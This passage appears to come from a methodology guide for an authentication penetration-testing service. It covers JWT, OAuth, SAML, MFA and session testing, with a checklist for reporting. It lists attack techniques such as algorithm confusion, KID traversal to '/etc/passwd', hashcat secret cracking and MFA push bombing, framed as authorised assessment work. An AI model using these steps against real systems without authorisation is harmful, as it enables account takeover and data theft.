| "Our SSO uses SAML from a trusted IdP." | SAML's complexity creates a wide attack surface: XML signature wrapping, comment injection, response tampering, IdP confusion, and metadata poisoning. The IdP may be trusted, but the XML parser in your SP might not be. |
| "Our passwords have complexity requirements." | Password complexity requirements don't prevent credential stuffing. Your auth mechanism might be rock-solid, but the same password reused on a breached service puts your user at risk. Without rate limiting, MFA enforcement, and anomaly detection, password strength is irrelevant. |
| "Rate limiting on login prevents brute force." | Rate limiting on the login endpoint doesn't protect against distributed credential stuffing (using thousands of IPs), and it doesn't protect JWT tokens at all. Token replay, session hijacking, and OAuth code interception don't hit the login endpoint. |
| "We only accept tokens signed with RS256." | Algorithm confusion attacks switch YOUR signing oracle from RS256 to HS256. If the server validation library uses the public key as the HMAC secret — and many do — the attacker forges tokens with the RSA public key they downloaded from your `/.well-known/jwks.json`. |
| "Our tokens expire in 15 minutes." | Short expiration limits the window but doesn't prevent token replay within that window. If an attacker intercepts a token via XSS, MITM, or OAuth code interception, 15 minutes is plenty of time to exfiltrate data or escalate privileges. Refresh token rotation and revocation are more important than expiration length. |

## Workflow

The auth assessment follows a systematic methodology:

1. **Reconnaissance Phase**
   - Map all authentication endpoints (login, register, password reset, MFA enrollment, token exchange, logout, session refresh)
   - Identify auth mechanisms in use (JWT, OAuth 2.0, OIDC, SAML, session cookies, API keys, magic links)
   - Gather tokens, client IDs, redirect URIs, and SAML responses from intercepting traffic
   - Discover `.well-known/openid-configuration`, `jwks.json`, and SAML metadata endpoints
   - Identify JWT library and version from error messages, headers, or response bodies

2. **JWT Analysis**
   - Run jwt_scanner.py against all collected tokens
   - Test algorithm confusion: RS→HS, none, JWK injection, JKU injection
   - Test KID/path traversal: `/dev/null`, `/etc/passwd`, `/proc/...`
   - Crack HMAC secrets with hashcat + RTX 2060 SUPER GPU (16500/16600/16700 modes)
   - Test claims manipulation: sub, role, exp, iat, nbf, admin flags
   - Analyze token storage: localStorage? Cookie? httpOnly? Secure? SameSite?
   - Test token replay timing: how long after issuance/expiration does the server accept?
   - Brute-force jku/kid header values to test server-side key fetching

3. **OAuth 2.0 / OIDC Flow Testing**
   - Map each OAuth flow: authorization code, implicit, client credentials, PKCE
   - Test redirect URI validation: registered vs unregistered URIs, open redirects, wildcards
   - Test state parameter enforcement: CSRF in OAuth, missing/static/predictable state
   - Test PKCE enforcement: authorization code interception without code_verifier
   - Test scope escalation: modify scope in authorization request, replace token scope
   - Test client_secret exposure: mobile apps, SPAs, public clients
   - Test token endpoint: brute-force, rate limiting, token reuse detection
   - Test refresh token rotation: replay old refresh tokens, revoke after use
   - Test IdP return URL manipulation: redirect to attacker-controlled callback

4. **SAML Assertion Testing** (when SAML SSO is in scope)
   - Intercept SAMLResponse and test XML signature wrapping
   - Remove signature entirely and test acceptance
   - Modify assertion attributes (NameID, email, roles)
   - Test comment injection in XML parsing
   - Modify AssertionConsumerServiceURL to attacker-controlled endpoint
   - Test NotBefore/NotOnOrAfter manipulation
   - Test AudienceRestriction removal
   - Test IdP metadata XML parsing vulnerabilities

5. **MFA Bypass Testing**
   - Complete MFA then test session token theft (can attacker reuse the session?)
   - Test backup/recovery code limits: how many attempts before lockout?
   - Test TOTP window: how many time steps are accepted (RFC 6238 says ±1)?
   - MFA bombing: send 50+ push notifications, does user eventually approve one?
   - SIM swap detection: does the system detect number porting?
   - MFA enrollment bypass: can user skip enrollment?
   - Device fingerprint manipulation: change User-Agent to bypass trusted device check
   - Biometric fallback: can attacker bypass fingerprint with device PIN?

6. **Session Management Testing**
   - Session token entropy: collect 10K+ session tokens and analyze randomness
   - Session fixation: can an attacker force a known session ID?
   - Concurrent session limits: how many simultaneous sessions allowed?
   - Session termination: does logout invalidate server-side? Are old tokens accepted?
   - Cookie security: Secure, HttpOnly, SameSite, Domain, Path, Max-Age
   - Idle timeout: does the server enforce inactivity limits?
   - Absolute timeout: is there a hard maximum session lifetime?

7. **Reporting Phase**
   - Generate HTML assessment report with all findings organized by severity
   - Include CVSS 3.1 scores, PoC evidence (curl commands, tokens, screenshots)
   - Provide remediation code examples for each finding
   - Conduct debrief call with development team to walk through findings
   - Offer retest after fixes are applied (included in Pro tier, 30-day window)

## Verification

- [ ] All auth endpoints discovered and documented with request/response samples
- [ ] JWT tokens analyzed: algorithm confusion, none algo, KID injection, claims manipulation, secret cracking
- [ ] OAuth flows tested: redirect URI validation, PKCE enforcement, state parameter, scope escalation
- [ ] SAML assertions tested: signature wrapping, response tampering, XML injection
- [ ] MFA bypass paths enumerated: session hijack, backup code abuse, push bombing, timing attacks
- [ ] Session management evaluated: token entropy, fixation, termination, cookie security flags
- [ ] Every finding has a clear PoC (curl command, crafted token, intercepted request)
- [ ] Every finding has CVSS 3.1 score with vector string
- [ ] False positives identified and excluded from final report
- [ ] Remediation guidance includes specific code examples, library versions, and configuration changes
- [ ] Report saved as HTML with all sections complete
- [ ] Client debrief scheduled to present findings and answer questions
